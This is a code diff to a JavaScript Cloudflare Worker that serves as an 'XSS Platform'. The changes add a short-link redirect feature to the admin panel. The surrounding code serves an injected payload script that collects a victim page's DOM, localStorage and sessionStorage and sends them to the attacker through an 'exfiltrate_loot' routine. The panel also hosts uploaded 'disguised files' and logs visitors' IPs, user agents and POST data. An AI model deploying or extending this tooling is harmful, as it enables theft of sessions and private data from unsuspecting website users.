@@ -162,7 +162,7 @@ var escapeHtml = (unsafe) => {
     return null;
   return unsafe.replaceAll("&", "&amp;").replaceAll("<", "&lt;").replaceAll(">", "&gt;").replaceAll('"', "&quot;").replaceAll("'", "&#039;");
 };
-var adminPageTemplate = '<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Cloudflare XSS Platform Admin</title>\n    <style>\n        table, td {\n            border-collapse: separate;\n            border: 1px solid #999;\n        }\n    </style>\n</head>\n<body>\n<h2>Cloudflare XSS Platform</h2>\n<a href="https://www.github.com/lyc8503">GitHub \u5730\u5740</a>\n\n<h4>\u4E0A\u4F20\u4F2A\u88C5\u6587\u4EF6</h4>\n<form action="?upload=do" method="post">\n    \u6587\u4EF6\u540D\u79F0: <input type="text" name="name"><br>\n    \u6587\u4EF6 BASE64 \u5185\u5BB9: <input type="text" name="base64">\n    <input type="submit" value="\u4FDD\u5B58">\n</form>\n\n<h4>\u8BBF\u95EE\u8BB0\u5F55</h4>\n\n<table>\n    <tr>\n        <th>\u8BBF\u95EE\u65F6\u95F4</th>\n        <th>\u8BBF\u95EEURL</th>\n        <th>IP</th>\n        <th>IP\u5730\u533A</th>\n        <th>UA</th>\n        <th>Referer</th>\n        <th>POST\u6570\u636E</th>\n    </tr>\n    ###TABLE###\n</table>\n</body>\n</html>';
+var adminPageTemplate = '<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Cloudflare XSS Platform Admin</title>\n    <style>\n        table, td {\n            border-collapse: separate;\n            border: 1px solid #999;\n        }\n    </style>\n</head>\n<body>\n<h2>Cloudflare XSS Platform</h2>\n<a href="https://www.github.com/lyc8503">GitHub \u5730\u5740</a>\n\n<h4>\u4E0A\u4F20\u4F2A\u88C5\u6587\u4EF6</h4>\n<form action="?upload=do" method="post">\n    \u6587\u4EF6\u540D\u79F0: <input type="text" name="name"><br>\n    \u6587\u4EF6 BASE64 \u5185\u5BB9: <input type="text" name="base64">\n    <input type="submit" value="\u4FDD\u5B58">\n</form>\n\n<h4>\u751F\u6210\u8DF3\u8F6C\u77ED\u94FE\u63A5</h4>\n<form action="?short=do" method="post">\n    \u77ED\u94FE\u5730\u5740: <input type="text" name="name"><br>\n    \u8DF3\u8F6C\u94FE\u63A5: <input type="text" name="target">\n    <input type="submit" value="\u4FDD\u5B58">\n</form>\n\n<h4>\u8BBF\u95EE\u8BB0\u5F55</h4>\n\n<table>\n    <tr>\n        <th>\u8BBF\u95EE\u65F6\u95F4</th>\n        <th>\u8BBF\u95EEURL</th>\n        <th>IP</th>\n        <th>IP\u5730\u533A</th>\n        <th>UA</th>\n        <th>Referer</th>\n        <th>POST\u6570\u636E</th>\n    </tr>\n    ###TABLE###\n</table>\n</body>\n</html>';
 async function handleRequest(request, env) {
   const url = new URL(request.url);
   if (url.pathname.substring(1).startsWith(KEY)) {
@@ -179,6 +179,11 @@ async function handleRequest(request, env) {
         const body = JSON.parse(await readRequestBody(request));
         await env.kv_storage.put("file_" + body.name, body.base64);
         return new Response("\u6587\u4EF6\u4E0A\u4F20\u6210\u529F: " + body.name);
+      }
+      if (searchParams.has("short")) {
+        const body = JSON.parse(await readRequestBody(request));
+        await env.kv_storage.put("short_" + body.name, body.target);
+        return new Response("\u77ED\u94FE\u63A5\u8BBE\u7F6E\u6210\u529F: /s/" + body.name);
       }
       return new Response("\u672A\u77E5\u8BF7\u6C42");
     } else {
@@ -219,13 +224,28 @@ async function handleRequest(request, env) {
     referer: request.headers.get("referer")
   };
   if (request.method === "GET") {
-    const randomKey = "get_" + new Date().getTime() + "_" + getUuid();
-    await env.kv_storage.put(randomKey, "", {
-      metadata
-    });
-    console.log("GET request logged: " + JSON.stringify(metadata));
-    let b64Data = null;
-    if (url.pathname.substring(1) !== "" && url.pathname.substring(1) !== DEFAULT_SCRIPT_NAME) {
+    try {
+      const randomKey = "get_" + new Date().getTime() + "_" + getUuid();
+      await env.kv_storage.put(randomKey, "", {
+        metadata
+      });
+      console.log("GET request logged: " + JSON.stringify(metadata));
+    } catch (e) {
+      console.error(e);
+    }
+    if (url.pathname.substring(0, 3) === "/s/") {
+      let target;
+      console.log("Try fetching target from kv storage: " + url.pathname.substring(3));
+      target = await env.kv_storage.get("short_" + url.pathname.substring(3));
+      if (target === null) {
+        console.log("Missing key from kv storage, using default.");
+        target = "https://www.baidu.com/";
+      } else {
+        console.log("Got data from kv storage, length: " + target.length);
+      }
+      return Response.redirect(target, 301);
+    } else if (url.pathname.substring(1) !== "" && url.pathname.substring(1) !== DEFAULT_SCRIPT_NAME) {
+      let b64Data;
       console.log("Try fetching data from kv storage: " + url.pathname.substring(1));
       b64Data = await env.kv_storage.get("file_" + url.pathname.substring(1));
       if (b64Data === null) {
@@ -236,9 +256,8 @@ async function handleRequest(request, env) {
       }
       return new Response(import_base64_js.default.toByteArray(b64Data));
     } else if (url.pathname.substring(1) !== "" && url.pathname.substring(1) === DEFAULT_SCRIPT_NAME) {
-      return new Response(`// From https://github.com/mazen160/xless/blob/master/payload.js
-
-console.log("Loaded script.");
+      return new Response(
+          `console.log("Loaded script.");
 var collected_data = {};
 
 var curScript = document.currentScript;
@@ -267,7 +286,6 @@ function collect_data() {
         try { collected_data["Browser Time"] = return_value(new Date().toTimeString()); } catch(e) {}
         try { collected_data["Origin"] = return_value(location.origin); } catch(e) {}
         try { collected_data["DOM"] = return_value(document.documentElement.outerHTML); } catch(e) {}
-        collected_data["DOM"] = collected_data["DOM"].slice(0, 8192)
         try { collected_data["localStorage"] = return_value(JSON.stringify(localStorage)); } catch(e) {}
         try { collected_data["sessionStorage"] = return_value(JSON.stringify(sessionStorage)); } catch(e) {}
         try {
@@ -307,7 +325,8 @@ function exfiltrate_loot() {
     script.src = "https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.7/dist/html2canvas.min.js";
     d.getElementsByTagName('head')[0].appendChild(script);
 }(document));
-`);
+`
+      );
     }
     return new Response("");
   } else if (request.method === "POST") {
